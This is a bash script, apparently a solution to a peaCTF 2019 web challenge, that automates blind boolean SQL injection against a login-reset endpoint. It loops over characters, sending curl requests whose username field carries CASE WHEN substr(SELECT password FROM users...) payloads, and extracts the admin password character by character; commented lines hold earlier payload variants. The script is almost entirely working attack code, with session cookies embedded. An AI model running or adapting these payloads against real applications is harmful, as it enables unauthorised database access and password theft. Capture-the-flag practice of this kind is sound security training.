#!/bin/bash

#username=admin' AND CASE WHEN (SELECT username FROM users WHERE username='admin')='adm' THEN 1 ELSE 0 END;--'&answer=test&debug=1
#username=admin' AND CASE WHEN LEN(SELECT password FROM users WHERE username='admin') < 8 THEN 1 ELSE 0 END;--'&answer=test&debug=1
#  
# '~' '`' '!' '@' '#' '$' '%' '^' '(' ')' '-' '_' '=' '+' '{' '}' '[' ']' ':' ';' '<' '>' ',' '.' 
# 
prefix='39935951'
cnt=9
for w in 0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q 'r' s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z; do
    pass="$prefix$w"
    data="$(cat <<EOM
username=admin' AND CASE WHEN substr((SELECT password FROM users LIMIT 1 OFFSET 0),1,${cnt}) = '${pass}' THEN 1 ELSE 0 END;--'&answer=test&debug=1
EOM
)"

    res="$(curl -Ss 'http://shell1.2019.peactf.com:39681/result.php' \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
        -H 'Accept-Language: en-US,en;q=0.7,ja;q=0.3' --compressed \
        -H 'Referer: http://shell1.2019.peactf.com:39681/reset.html' \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -H 'DNT: 1' \
        -H 'Connection: keep-alive' \
        -H 'Cookie: __cfduid=d119fb490779bf74814ec9a2d930a56941561792700; token=d3455fdfcae740ba987d420834377f5a; flask=.eJwNyjEOgzAMAMC_eGYwsVM7fAa5sSNViLRCYUL8nd58F6y_OHbr0Qcs4zhjgvHdosMCTpxz81YthPFtRcU5oRKTSMsGE5wf_8cXGnvlWmZPTMjaeI6azKWQKiHcD3wHHcU.XTVMUQ.CjnT924H3aSoe62lGOMTfyqXBnY; user=admin' \
        -H 'Upgrade-Insecure-Requests: 1' \
        --data "$data"
    )"

    echo "$res" > data/$pass

    if [ ! "$(echo "$res"|grep 'User does not exist')" ];then
        echo "Ok!!! pass is $pass*"
        break
    else
        echo "NG: $pass*"
    fi
done

